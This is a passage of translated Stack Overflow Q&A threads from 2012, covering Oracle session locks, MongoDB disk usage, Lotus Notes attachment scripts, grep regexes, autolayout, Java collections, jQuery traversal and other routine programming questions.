List<IList<V>> values_size3 = values.Chunk(3).ToList();
List<IList<V>> values_size4 = values.Chunk(4).ToList(); 
```

# sql - 在 Oracle 10 中删除锁

> ID：13845655
> 
> 赞同：24
> 
> 时间：2012-12-12T17:49:43.280
> 
> 标签：sql, oracle, sqlplus

尝试更新 sqlplus 中的列值时遇到问题。

它基本上不会完成，只是挂起。我想知道是否有强制删除oracle中的锁？

我注意到一个名为 v$locked_object 的表确实包含与我遇到的问题相关的 onject ID。

希望我已经解释得足够好。

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2012-12-12T18:06:04.947

这将完全符合您的目的：

```
SELECT SESSION_ID FROM DBA_DML_LOCKS WHERE NAME = <TABLE_NAME>; 
```

使用`SESSION_ID`查找`SERIAL#`与此语句对应的：

```
SELECT SID, SERIAL# FROM V$SESSION WHERE SID IN (
    SELECT SESSION_ID FROM DBA_DML_LOCKS WHERE NAME = <TABLE_NAME>
); 
```

找到有问题的元组`SID, SERIAL#`并像这样释放它：

```
ALTER SYSTEM KILL SESSION 'SID, SERIAL#'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:05:06.003

设法解决了这个问题。

我查看了 DBA_BLOCKERS 表并获得了会话 ID。然后终止会话并删除锁定。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:52:51.060

可能，其他人已经更新了同一张表并且还没有提交。甚至可能是您（在不同的工具或不同的会话中）。

摆脱锁定的最简单方法是在另一个会话中提交工作。

# c# - 尝试循环遍历linq查询结果并在js代码中显示

> ID：13845657
> 
> 赞同：0
> 
> 时间：2012-12-12T17:49:52.963
> 
> 标签：c#, javascript, asp.net, linq-to-sql

我正在使用谷歌地图 api 在网页上显示位置。我已经使用静态位置来完成这项工作，如下面的 js 代码所示。我已将确切位置放入 sql 表中，而是希望通过使用表而不是硬编码位置来显示位置。基本上我想遍历我的 linq 结果并在 javascript 代码中显示它。所以 var locations = (我的结果集) 我知道我的代码离我很远，但认为它有助于展示我想要完成的事情。任何帮助，将不胜感激！谢谢

```
protected void Page_Load(object sender, EventArgs e)
    {
        using (var db = new DataClasses1DataContext())
        {
            var place = (from p in db.Coordinates
                         select new {locName = p.LocationName, 
                             Coord1 = p.Coordinate1,  
                             Coord2 = p.Coordinate2}).ToList();

            //List<string> listPlaces = new List<string>();

            foreach (var result in place)
            {
                string name = place.locName;
                bool Coordinate1 = place.Coord1;
                bool Coordinate2 = place.Coord2;
            }
        }
    }

    <script type="text/javascript">
    var locations =
        ['Bondi Beach', -33.890542, 151.274856],
        ['Coogee Beach', -33.923036, 151.259052],
        ['Cronulla Beach', -34.028249, 151.157507],
        ['Manly Beach', -33.80010128657071, 151.28747820854187],
        ['Maroubra Beach', -33.950198, 151.259302]
    ]; 
```

编辑：我确实让它正确处理表中的第一条记录，但最终结果需要是所有行。

C#: var place = (from p in db.Coordinates where p.LocationName == "Adam" select p).FirstOrDefault(); 名称=地点。位置名称；coord1 = place.Coordinate1.Value; coord2 = place.Coordinate2.Value;

Javascript: var name2 = "<%=name%>"; var coord1 = "<%=coord1%>"; var coord2 = "<%=coord2%>";

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T20:16:50.453

您有许多选择：将其构建为字符串，在对象上使用 JsonSeralizer，AJAX 调用方法来获取 JSON，还有很多其他的......

对我来说，将它构建为字符串是一种简单易行的方法（对于这种复杂性和大小的对象）：

在 aspx 页面上：

```
<script type="text/javascript">
var locations = <asp:literal id="locations" runat="server" />;
</script> 
```

代码：

```
StringBuilder sb = new StringBuilder();
bool isFirst = true;
foreach (var result in place)
{
    if (!isFirst)
    {
        sb.Append(",");
    }
    isFirst = false;

    //Add the item data
    sb.AppendFormat("['{0}', {1}, {2}]", result.locName, result.Coord1, result.Coord2);
}
locations.Text = sb.ToString(); 
```

您还可以使用`Page.ClientScript.RegisterClientScriptBlock`以更动态的方式将脚本添加到页面。

# mongodb - MongoDB 文件太大

> ID：13845661
> 
> 赞同：3
> 
> 时间：2012-12-12T17:50:14.057
> 
> 标签：mongodb, size, filesize, database

我只是想了解为什么 MongoDB 使用这么多磁盘空间，或者更好的是可能减少它。

下面只是一个例子。我的 storageSize 为 1.35GB（包括 dataSize + 预分配空间），索引大小约为 0.5GB，总计约为 2GB。我知道 mongodb 分配 2GB 文件，所以你可以在那里释放一些空间，但是怎么可能使用 6GB 的文件大小呢？填充设置为1，实际上它只是一次写入数据，从不进行任何删除或更新。有没有可能减少文件大小？

就我而言，MongoDB 使用的空间是我的传统 SQL 解决方案的 6 倍。我真的很想使用 MongoDB，但我需要找到减少磁盘空间的方法。谢谢！

```
> db.stats(1024*1024)
{
    "db" : "data",
    "collections" : 4345,
    "objects" : 9328910,
    "avgObjSize" : 67.95158105287756,
    "dataSize" : 604,
    "storageSize" : 1350,
    "numExtents" : 6480,
    "indexes" : 8686,
    "indexSize" : 511,
    "fileSize" : 6078,
    "nsSizeMB" : 16,
    "ok" : 1
} 
```

注意：“数据”是此统计信息中使用的唯一数据库

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-21T10:05:24.340

> 有没有可能减少文件大小？

嗯，部分是的。如果您有一个小型/[许多小型] 数据库/s，您可能希望[`smallfiles`](https://docs.mongodb.com/manual/reference/configuration-options/#storage.mmapv1.smallFiles)在启动数据库进程/es 时使用该标志。
通过这样做，您会将预分配的文件从最大 2 GB 减少到最大 512 MB，并将日志文件从 1 GB 减少到 128 MB。需要注意的是，如果您在大型数据库中使用此标志，服务器需要创建许多文件，这可能会影响性能。

如果您从数据库中删除了足够多的数据，您可以运行该[`db.repairDatabase()`](https://docs.mongodb.com/manual/reference/command/repairDatabase/#dbcmd.repairDatabase)命令来释放未使用的磁盘空间。请记住，运行此命令将在您的数据库中创建一个全局块。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-21T09:15:00.097

我不明白的是，在 unix 系统中，mongodb 不仅预分配当前文件，还预分配 NEXT 文件，这可能导致 2+2=4GB 总预分配...

# c# - 如何找到动态创建的按钮？

> ID：13845669
> 
> 赞同：0
> 
> 时间：2012-12-12T17:50:55.443
> 
> 标签：c#, wpf, button, dynamic, client-server

我正在制作一个包含井字游戏的客户端/服务器应用程序，两个连接的客户端可以在其中玩游戏。3 x 3 网格由 9 个动态创建的按钮组成。当第一个客户端单击网格上的按钮时，该按钮被禁用并且内容显示“X”。一个值被发送到服务器，然后发送到另一个连接的客户端。根据客户端收到的值，我希望禁用相同的按钮并将内容更改为“X”。

我遇到的问题是找到在客户端动态创建的按钮。任何帮助表示赞赏！

```
 //Dynamically created 9 buttons on the client
 private void initBoard(int rank)
    {

        board = new tttBoard(rank);
        boardGrid.Children.Clear();
        boardGrid.Rows = rank;
        for (int i = 0; i < rank; i++)
        {
            for (int j = 0; j < rank; j++)
            {
                newButton = new Button();
                newButton.Tag = new Point(i, j);
                newButton.Name = "b" + i.ToString() + j.ToString();
                newButton.Content = newButton.Tag;
                boardGrid.Children.Add(newButton);
            }
        }
    }

//Method that receives data - CheckButton called method within this
public void OnDataReceived(IAsyncResult ar)
    {
        try
        {
            SocketPacket sckID = (SocketPacket)ar.AsyncState;
            int iRx = sckID.thisSocket.EndReceive(ar);
            char[] chars = new char[iRx];
            Decoder d = Encoding.UTF8.GetDecoder();
            int charLen = d.GetChars(sckID.dataBuffer, 0, iRx, chars, 0);
            szData = new String(chars);
            this.Dispatcher.Invoke((Action)(() =>
            {
                if(szData.Contains("Clicked button : "))
                {
                    return;
                }
                else
                    lbxMessages.Items.Add(txtMessage.Text + szData);
            }));

            ClickButton();

            WaitForData();
        }
        catch (ObjectDisposedException)
        {
            Debugger.Log(0, "1", "\n OnDataRecieved: Socket has been closed\n");
        }
        catch(SocketException se)
        {
            MessageBox.Show(se.Message);
        }
    }

//based on the message received from the server, I check to see if 
//it contains "Clicked button: " and a value that I use to locate the correct 
//button to disable and change content to 'x' to represent the move made by the 
//other client

public void ClickButton()
    {
        if (szData.Contains("Clicked button : "))
        {
            value = szData.Substring(17, 1);
        }
        this.Dispatcher.Invoke((Action)(() =>
        {
            btnName = "b0" + value;
            object item = grdClient.FindName(btnName);//boardGrid.FindName(btnName);
            if (item is Button)
            {
                Button btn = (Button)item;
                btn.IsEnabled = false;
            }
        }));
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:10:39.490

您拥有客户端代码吗？如果是这样，听起来你让它变得比需要的更困难。为什么不使用一个 3x3 数组来简化实现，该数组包含对每个井字游戏位置中的按钮的引用。然后您所要做的就是从客户端消息中提取按钮的坐标，并在另一个客户端上更新相同位置的按钮。

例如，消息“clicked button : 2, 1”将转换为：

```
buttonArray[2,1].Enabled = false; 
```

或您需要对按钮执行的任何其他操作。

# vbscript - VBScript: Lotus Notes autosave attachments with specific extension

> ID：13845670
> 
> 赞同：0
> 
> 时间：2012-12-12T17:50:58.153
> 
> 标签：vbscript, lotus, attachment, autosave

Early, I posted theme "Groovy: autosave attachment with specific extension from Lotus Notes", but couldn't find any solution, so i found different vbscripts and make own. Its works, but now i have a problem: letter doesn't delete after as script autosave attach. I see error: "All objects must be from the same session". I will be grateful for any idea.

```
Dim Session 
Dim Maildb 
Dim vw 
Dim doc 
Dim Item 
Dim x 
Set Session = CreateObject("Lotus.NotesSession") 
Call Session.Initialize("password") 
Set Maildb = Session.GetDatabase("SERVER", "mail.nsf") 
If Not Maildb.IsOpen = True Then 
Call Maildb.Open 
End If 
Set vw = Maildb.GetView("($inbox)") 
With vw 
x = 0 
ReDim LmailID(x) 
ReDim HasAttach(x) 
Set doc = .GetFirstDocument 
Set Item = doc.GetFirstItem("Body") 
Do 
If Item.Type = RICHTEXT Then  -  here i try take unread message and it doesnt work
fileNames = Session.Evaluate("@AttachmentNames", doc) 
For Each Filename In fileNames 
If Filename <> "" Then 
If Right(Filename, 3) = "bch" Then
Call doc.Save( False, True, True )
Set NotesEmbeddedObject = doc.GetAttachment(Filename) 
NotesEmbeddedObject.ExtractFile ("C:\" + Filename) 
Set reply = doc.CreateReplyMessage( False )
Call reply.replaceItemValue("Subject", "DONE" + subject)
Call reply.Send( False )
Set nextDoc = .GetNextDocument(doc)
Set doc = nextDoc
End If 
End If 
Next 
End If
x = x + 1 
ReDim Preserve LmailID(x) 
Set doc = .GetNextDocument(doc) 
Wscript.Sleep 500 
Loop Until doc Is Nothing 
End With 
Set Session = Nothing 
Set vw = Nothing 
Set doc = Nothing 
Set Item = Nothing 
Set Maildb = Nothing 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:55:11.257

Some hints: Inside the loop you are using `.GetFirstDocument`. Move that outside the loop (outside `With vw`) and then use `.GetNextDocument(doc)` inside the loop (as you are already doing).

Also, you are calling `doc.Remove(True)` and then later trying to fetch the next document by refering to the `doc` instance that you just deleted. To fix this, you can add another document instance such as `nextDoc` and then use this as a temporary document while you delete the `doc` instance:

Before you delete doc:

```
Set nextDoc = .GetNextDocument(doc) 
```

After you have deleted doc:

```
Set doc = nextDoc 
```

# ms-access - 访问交叉表查询以在每个单元格中显示两个值？

> ID：13845674
> 
> 赞同：1
> 
> 时间：2012-12-12T17:51:03.167
> 
> 标签：ms-access, vba, crosstab

我有一个有四个字段的查询，`TraineeName, TrainerName, TrainingType, TrainingDate.`

我想要`TraineeName as row headings, TrainingType`作为列标题，并且都`TrainerName and TrainingDate`作为值。我可以这样做吗？

我想快速查看某个员工是否在任何领域、何时以及由谁接受过​​培训。有一个更好的方法吗？我想制作一份可以打印以供审核的报告。我有大约 60 名员工和 20 种培训类型。

谢谢！！

更新：附加信息

```
Table with Employees...  Bob, Bill, Jim, Sandy
Table with Trainers....  Red Cross, Forklifts 'R' Us, Fire Dept
Table with Training....  First Aid, CPR, Forklift Safety, Fire Extinguishers 
```

三者的关系表......

```
 Employee     Trainer            Training          Date
 1\. Bob,         Red Cross,         First Aid,        12/5/11
 2\. Bob,         Forklifts 'R' Us,  Forklift Safety,  5/18/11
 3\. Bill,        Red Cross,         CPR,              12/5/11 
```

现在我想要一份报告，将所有员工列在下面，所有培训都列在上面。然后我可以快速查看哪些员工接受了培训，培训时间和培训人员。因此 Employee 和 Training 之间的每个连接点都需要两个值。我可以将培训师添加为另一列，但随后它将为每个员工/培训师组合创建一个新行。

表Employees有几个字段，但最重要的是EmployeeID（pk和autonumber），EmployeeName

表 Trainer 类似，TrainerID（pk 和自动编号）、TrainerName

表Training类似，TrainingID（pk和autonumber），TrainingName

表 TrainingLog 有 LogEmployeeID、LogTrainerID、LogTrainingID、LogTrainingDate。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-17T05:52:49.800

我知道它是很久以前发布的，但最简单的答案是为您的结果创建两个单独的交叉表查询，然后将它们与普通的选择查询结合起来。

# regex - 在 bash 中使用正则表达式查找文件

> ID：13845676
> 
> 赞同：2
> 
> 时间：2012-12-12T17:51:10.823
> 
> 标签：regex, bash, shell, scripting

基本上我要做的是列出具有特定扩展名的当前目录的内容（在我的情况下是 .c 文件）。

所以我认为可行的是：

```
ls | grep .\*\.c 
```

它主要工作，但也返回以 c 结尾的文件

1.  音乐（这是一个目录）
2.  测试.doc

我的正则表达式是否有问题，因为我看不到它。

非常感谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T17:53:15.097

您可以简单地使用`ls *.c`列出当前目录中具有`.c`扩展名的所有文件。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T17:53:16.843

以下是您可以执行的操作：

```
find -name "*.c" 
```

它会`.c`从当前工作目录递归地为您找到所有带有扩展名的文件。

或者，如果您想要非递归并且想要使用`ls`，您可以执行以下操作：

```
ls *.c 
```

如果您想知道如何将正则表达式应用于`grep`搜索`ls`结果（即使这更麻烦）：

```
ls | grep ".*\.c$" 
```

正则说明：

*   `.`- 匹配任何字符
*   `.*`- 匹配任何字符零次或多次
*   `.*\.`- 匹配任何字符零次或多次，然后匹配一个`.`字面意思（通过“转义”它指定`\`）
*   `".*\.c`- 匹配任何字符零次或多次，然后匹配`.`字面意思，然后匹配字符`c`
*   `.*\.c$`- 匹配任何字符零次或多次，然后匹配 a`.`字面意思，然后匹配 char `c`；并且仅当这是模式的结尾（在那之后没有更多的东西）。`$`是“结束”的正则表达式锚。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-12T17:57:50.470

你很接近

```
ls | grep \\.c$ 
```

查看双反斜杠

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-12T17:59:49.020

您需要转义反斜杠：

```
ls | grep .*\\.c 
```

# objective-c - Mac OS X 中的自动布局和调整视图大小

> ID：13845677
> 
> 赞同：2
> 
> 时间：2012-12-12T17:51:17.440
> 
> 标签：objective-c, macos, cocoa, autolayout

我正在尝试为 Mac OS X 10.7 进行自动布局设计。

我的应用程序有一个固定宽度/高度的窗口。我真正想做的是调整窗口中控件的大小。例如，我有一个搜索字段，如果单击它应该展开和折叠。我在左侧放置了一个 NSPathControl，如果 NSSearchField 展开，它应该会缩小，因此它们不会折叠。

现在，如果我调整窗口大小，它可以工作，但如果我在代码中设置视图的框架，它不会。自动布局只是忽略了这一点。

我只是在做`[[this animator] setFrame:newFrame];`。

有什么我必须在自动布局中启用的，还是我必须在代码中以不同的方式设置框架？

**编辑**

`self.translatesAutoresizingMaskIntoConstraints = YES;`通过在搜索字段中进行设置，我得到了约束。我不确定这是否是个好主意。

此外，它给了我以下日志：

```
2012-12-12 19:41:30.958 Expanding Search[1428:303] Unable to simultaneously satisfy constraints:
(
    "<NSAutoresizingMaskLayoutConstraint:0x101a0d800 h=&-- v=&-- H:[ITSearchField:0x10011bb20]-(1)-|   (Names: '|':ITPathbar:0x10190a670 )>",
    "<NSLayoutConstraint:0x10190c520 H:[ITSearchField:0x10011bb20]-(2)-|   (Names: '|':ITPathbar:0x10190a670 )>"
)

Will attempt to recover by breaking constraint 
<NSLayoutConstraint:0x10190c520 H:[ITSearchField:0x10011bb20]-(2)-|   (Names: '|':ITPathbar:0x10190a670 )>

Set the NSUserDefault NSConstraintBasedLayoutVisualizeMutuallyExclusiveConstraints to YES to have -[NSWindow visualizeConstraints:] automatically called when this happens.  And/or, break on objc_exception_throw to catch this in the debugger.
2012-12-12 19:41:32.835 Expanding Search[1428:303] 74
2012-12-12 19:41:32.854 Expanding Search[1428:303] Unable to simultaneously satisfy constraints:
(
    "<NSAutoresizingMaskLayoutConstraint:0x101a0d800 h=&-- v=&-- H:[ITSearchField:0x10011bb20]-(14.5)-|   (Names: '|':ITPathbar:0x10190a670 )>",
    "<NSLayoutConstraint:0x10190c520 H:[ITSearchField:0x10011bb20]-(2)-|   (Names: '|':ITPathbar:0x10190a670 )>"
)

Will attempt to recover by breaking constraint 
<NSLayoutConstraint:0x10190c520 H:[ITSearchField:0x10011bb20]-(2)-|   (Names: '|':ITPathbar:0x10190a670 )>

Set the NSUserDefault NSConstraintBasedLayoutVisualizeMutuallyExclusiveConstraints to YES to have -[NSWindow visualizeConstraints:] automatically called when this happens.  And/or, break on objc_exception_throw to catch this in the debugger. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T18:11:38.810

# 我的解决方案

* * *

我明白了，我在 Github 上发布了[它](https://github.com/iluuu1994/ITSearchField)。

我还问了另一个更具体的问题，在[这里](https://stackoverflow.com/questions/13857115/getting-an-existing-nslayoutconstraint-for-the-width)得到了解决。

* * *

问题是你实际上不应该调用 setFrame: 当你使用自动布局时。你应该得到正确的约束并改变它。它使它更容易，您可以简单地设置宽度并自动为您处理框架原点。

# nsinteger - NSInteger 是否允许小数位？

> ID：13845679
> 
> 赞同：1
> 
> 时间：2012-12-12T17:51:17.263
> 
> 标签：nsinteger, decimal, cgfloat

我需要有人输入一个值，比如“40”，然后应用程序通过除以 7.5 将其转换为另一个值。目前我已经完成了：

```
 NSString *pCO2 = _pCO2.text;
    float thepCO2 = [pCO2 floatValue];
    NSInteger newpCO2 = thepCO2/7.5;
    NSString *finalpCO2 = [NSString stringWithFormat:@"%d", newpCO2]; 
```

然后，在另一个视图中，该应用程序获取名为 finalpCO2 的 NSString 并将其转换回一个数字，如下所示：

```
float newpCO2 = ([pCO2 floatValue]); 
```

但是，当我这样做时，初始 pCO2 高于 38 的值似乎被四舍五入为 5（38 除以 7.5 = 5.0666），低于此值被四舍五入为 4（37 除以 7.5 = 4.93）

有谁知道为什么会发生这种情况？我希望这个数字至少到最接近的小数位。

谢谢

莱斯

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:55:54.200

`NSInteger`只存储[整数](http://en.wikipedia.org/wiki/Integer)，所以不存储小数位。如果需要存储浮点值，请使用`NSFloat`or 。`NSDecimal`

# c# - ListView Item点击打开TabPage

> ID：13845681
> 
> 赞同：1
> 
> 时间：2012-12-12T17:51:22.807
> 
> 标签：c#, windows

[截屏](http://jafile.com/uploads/scoop/screenshot__41_.png)

**所以问题是，是否可以使用 ToolStripMenuItem_Click 在列表视图中显示标签页按钮，或者如何通过单击列表视图项来打开我想要的标签页？**

在我的另一个应用程序中，我创建了一个带有 30 个单选按钮的 scollbox 和一个带有 30 个选项卡的选项卡控件（选项卡被隐藏并且无法单击）

我使用此代码打开标签页

```
 private void radioButton1_CheckedChanged(object sender, EventArgs e)
    {
        tabControl2.SelectedTab = tabPage4;
    } 
```

# java - Java 和数据结构（Map、Hashmap、List、Arraylist，...）

> ID：13845683
> 
> 赞同：1
> 
> 时间：2012-12-12T17:51:34.130
> 
> 标签：java, list, map, arraylist, hashmap

我是 Java 和 Android 开发的新手，我遇到了以下问题。我的应用程序从数据库中获取一些数据，我想按以下方式构建这些数据：

```
DATA = 
{ 
  RESULT[0] = 
  {
    ARRAY[0]=
    {
      VALUE[0], ..., VALUE[X]
    },
    ARRAY[1] = 
    {
      VALUE[0], ..., VALUE[Y]
    },
    ...,
    ARRAY[N] = 
    {
      VALUE[0], ..., VALUE[Z]
    }
  },
  RESULT[1] =
  {
    /* Same as above */
  },
  ...,
  RESULT[M] =
  {
    /* Same as above */
  }
} 
```

where`X, Y, ..., Z`可以在每个`ARRAY`中有所不同，`RESULT`但`N`对所有始终相同`RESULT`。我想访问`DATA`以便我可以`ARRAY`从上面的结构中读取 s

```
ListArray<String> array = readData(indexOfResult,indexOfArray); 
```

其中`indexOfResult`0...M 和`indexOfArray`0...N。

我试过这个

```
Map<Integer,List<Map<Integer,ArrayList<String>>>> data
 = new HashMap<Integer,List<Map<Integer,ArrayList<String>>>>(); 
```

但也许更简单的东西可以完成这项工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:57:53.357

您最好将对象结构的每一级包装在一个代表它的类中。例如：

*   该类`Data`包含一个类数组（或数组列表）`Result` 。
*   `Result`包含 的数组（或数组列表）`ValueCollection`，其中包含值。

这只是一个粗略的建议。面对这种情况时，总是尝试定义代表全局不同层次的类，从主容器开始，再到可以用集合或字段表示的微小数据。

自己想一个设计（如果你不能直接在代码上想出一个，我总是推荐笔和纸）并尝试一下。这是最好的学习方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-22T21:02:59.887

我解决了我的问题

```
SparseArray<SparseArray<ArrayList<String>>> 
```

但是，我遇到了另一个我无法理解的问题。我做以下

```
/* MAIN */

Data data;

String s = "";
ArrayList<String> arr_N = new ArrayList<String>();
arr_N.add(s);
data.addResult(arr_N); 
```

在课堂上我有

```
/* CLASS DEFINITION */

class Data {

  private final static int N_A = 0;
  private SparseArray<SparseArray<ArrayList<String>>> results;
  private int n_results;

  public Data() {
    this.results = new SparseArray<SparseArray<ArrayList<String>>>();
    this.n_results = 0;
  }

  public void addResult(ArrayList<String> a) {
    SparseArray<ArrayList<String>> result = new SparseArray<ArrayList<String>>(1);
    result.put(N_A,a);
    this.results.put(this.n_results,result);
    this.n_results++;
  }

  public ArrayList<String> getA_N(int i) {
    return( this.get_value(i,N_A) );
  }

  private ArrayList<String> get_value(int i, int j) {
    SparseArray<ArrayList<String>> result = this.results.valueAt(results.keyAt(i));
    ArrayList<String> list = result.valueAt(result.keyAt(j));
    return( list );
  }
} 
```

现在，如果我这样做

```
/* MAIN */

int i = 0; /* Something that is < n_results in class Data */
ArrayList<String> r = data.getA_N(i);
int n_r = r.size();
System.out.println("Size of a_n is " + r.size() ); 
```

我得到“a_n 的大小为 1”。

Q1：一开始我设置了`s = "";`但是是不是这样就不会被当作空字符串处理？

Q2：如果我这样做，`r.isEmpty()`我会得到 r 不是空字符串（尽管我设置了`s = "";`）。这是为什么？

Q3：如果我`s = null`在开始时设置，我仍然得到`r`上面（在 MAIN 中）的大小为 1，即使`r.get(i)`（其中 0 <= `i`< `n_results`）给了我 Index out of bounds 异常。这是为什么？

好吧，我想我不应该把它`a`放进去`result`，或者有趣的东西。`addResult``""``null`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T18:00:34.070

您可能应该创建一些代表您要显示的内容的类，而不是对所有内容进行参数化。

例如

```
class Example implements Map<Integer, List<String>> {
...
} 
```

或者，如果您想按照自己的方式进行操作：

```
Map<Integer,List<Map<Integer,ArrayList<String>>>> data = new HashMap<Integer,List<Map<Integer,ArrayList<String>>>>();

List<Map<Integer,ArrayList<String>>> list1 = new Arraylist<Map<Integer,ArrayList<String>>>();
Map<Integer,ArrayList<String>> map1 = new HashMap<Integer,ArrayList<String>>();
ArrayList<String>> list2 = new ArrayList<String>>();

list2.add("test");
map1.add(1, list2);
list1.add(map1);

data.put(1, list1); 
```

然后你必须编写一个方法，从你的数据结构中获取这些数据。但是您应该始终尝试尽可能简单地编写代码并将所有内容结构化，以便易于理解。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T18:02:36.560

你有一些选择：

```
Map<Integer,List<String[]> result; 
```

或者

```
List<List<String[]> result; 
```

或者

```
List<List<List<String>>> result; 
```

甚至

```
String[][][] result; 
```

...取决于您的使用情况和您的喜好。

# c++ - 在 sublime text 2 中运行 c++ 代码会显示奇怪的消息？

> ID：13845694
> 
> 赞同：-3
> 
> 时间：2012-12-12T17:52:23.363
> 
> 标签：c++, sublimetext2

> [错误2] 系统找不到指定的文件 [cmd: [u'bash', u'-c', u"g++ 'C:\Program Files\Sublime Text 2\Average' -o 'C:\Program Files \Sublime Text 2/Average' && 'C:\Program Files\Sublime Text 2/Average'"]] [目录：C:\Program Files\Sublime Text 2] [路径：C:\WINDOWS\system32;C:\ WINDOWS;C:\WINDOWS\System32\Wbem;C:\TCWIN45\BIN]

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:55:31.230

显然你没有 bash 或 g++。既然你在窗户上，那是合乎逻辑的。Bash 是 windows 默认不包含的东西。您可能需要微软在 MSDN 上提供的 unix 工具。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:55:39.577

您不能在 Sublime Text 2 中“运行”C++ 代码。不过，您*可以从中*调用 make（和任意其他程序）。这是试图运行 bash 和 g++，这两者通常不是 Windows 环境的一部分。

# facebook - 每个页面的 Facebook 喜欢按钮（Facebook 应用程序）

> ID：13845697
> 
> 赞同：0
> 
> 时间：2012-12-12T17:52:34.347
> 
> 标签：facebook, facebook-like

我想问一下，是否可以为 eshop 上的每个产品创建某种类似 facebook 的按钮并将其连接到 facebook 应用程序（这样就可以看到图表和喜欢的页面）。

我有这个代码：

```
 <iframe src="http://www.facebook.com/widgets/like.php?href=www.someurl.com" scrolling="no" frameborder="0" style="border:none; width:311px; height:25px"></iframe> 
```

这是基本的 facebook 按钮，但它没有连接到任何应用程序。所以我在 facebook 上的应用程序中什么也看不到。

谢谢你的时间

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:40:30.537

是的，添加`appId`参数。例如：

```
<iframe src="//www.facebook.com/plugins/like.php?href=http%3A%2F%2Fwww.plooza.com&amp;send=false&amp;layout=standard&amp;width=450&amp;show_faces=true&amp;font&amp;colorscheme=light&amp;action=like&amp;height=80&amp;appId=381429131919273" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe> 
```

使用like按钮工具创建iframe代码：

[https://developers.facebook.com/docs/reference/plugins/like/](https://developers.facebook.com/docs/reference/plugins/like/)

# jquery - jquery dom通过父/子遍历

> ID：13845698
> 
> 赞同：0
> 
> 时间：2012-12-12T17:52:37.107
> 
> 标签：jquery, jquery-traversing

我有几个实例

```
(".wrappingdivclass > .hovercontents > .hovercontent2") 
```

在页面上.. 都需要独立运行，但调用相同的 jquery。如您所见，它的两个相同的 HTML 块...

我将如何向上/向下移动 dom 树以仅将悬停/显示隐藏在 wrappingclass div 中的内容上，而不影响下一个 wrappingclass div 的所有内容。

```
<div class="wrappingclass" id="notthesecondone">
 <div class="hoverheaders">
     <p class="hoverheading">on hover display stuff</p>
     <p class="hoverheading1">on hover display stuff1</p>
     <!-- iterate, as needed !-->
    </div>
     <div class="hovercontents">
      <p class="hovercontent">stuff</p>
      <p class="hovercontent1">stuff1</p>
              <!-- iterate, as needed !-->
  </div>
    <div class="wrappingclass" id="notthefirstone">
 <div class="hoverheaders">
     <p class="hoverheading">on hover display stuff/hide stuff1</p>
     <p class="hoverheading1">on hover display stuff1/hidestuff</p>
     <!-- iterate, as needed !-->
    </div>
     <div class="hovercontents">
      <p class="hovercontent">stuff</p>
      <p class="hovercontent1">stuff1</p>
              <!-- iterate, as needed !-->
  </div> 
```

这是jQuery：

```
//does not work
jQuery(document).ready(function() {
  jQuery(".hovercontent").show();
  //toggle the componenet with class msg_body
  jQuery(".hoverheading").hover(function()
  {
     jQuery(this).parent().children(".hovercontent").show()
    jQuery(this).parent().children(".hovercontent").siblings().hide();
  });
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:55:03.080

尝试更换

```
jQuery(this).parent().children(".hovercontent").show()
jQuery(this).parent().children(".hovercontent").siblings().hide(); 
```

和

```
jQuery('.hovercontent').hide();
jQuery(this).closest('.hovercontent').show 
```

### 编辑

替换`hover`为`mouseover`

### 最终编辑，

它实际上是这样的..（内部 DOM 准备就绪）

```
$("p[class^=hovercontent]").hide();
//toggle the componenet with class msg_body
$("p[class^=hoverheading]").mouseover(function() {
    $("p[class^=hovercontent]").hide();
    $(this).closest('.hoverheaders').next().find('p').eq($(this).index()).show();
});​ 
```

演示 - [http://jsfiddle.net/68UVj/](http://jsfiddle.net/68UVj/)

# python - PyDev eclipse 显示编译错误红色标记，但运行正常？

> ID：13845706
> 
> 赞同：1
> 
> 时间：2012-12-12T17:53:00.837
> 
> 标签：python, eclipse, pydev

以下代码由 PyDev eclipse 插件自动生成，通过选择“new --> PyDev project”，新建“PyDev Module”，然后选择“Unittest”

但在eclipse编辑器上，“import unittest”上显示一个红色标记，表示模块无法导入。但这件事运行良好。我正在使用 python 2.7 和 eclipse 3.6

```
'''
Created on Dec 12, 2012

@author: yang
'''
import unittest

class Test(unittest.TestCase):

    def testName(self):
        pass

if __name__ == "__main__":
    #import sys;sys.argv = ['', 'Test.testName']
    unittest.main() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-25T08:15:10.573

解决方案如下： -

我通过以下方式删除了这些错误：

`Window -> Preferences -> PyDev -> Editor -> Code Analysis -> Undefined -> Undefined Variable From Import -> Ignore`

对于导入未找到错误：-

也可能是，

`Window -> Preferences -> PyDev -> Editor -> Code Analysis -> Imports -> Import not found -> Ignore`

我们强制删除这些错误，因为 python 解释器对此没有解决方案。

如果您需要这方面的更多信息，请告诉我。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-01-05T12:13:50.583

您必须在本地系统中有一个 unittest.py 文件，该文件与 unittest 模块混淆。重命名您的文件并连同此一起删除 .pyc 文件。

* * *

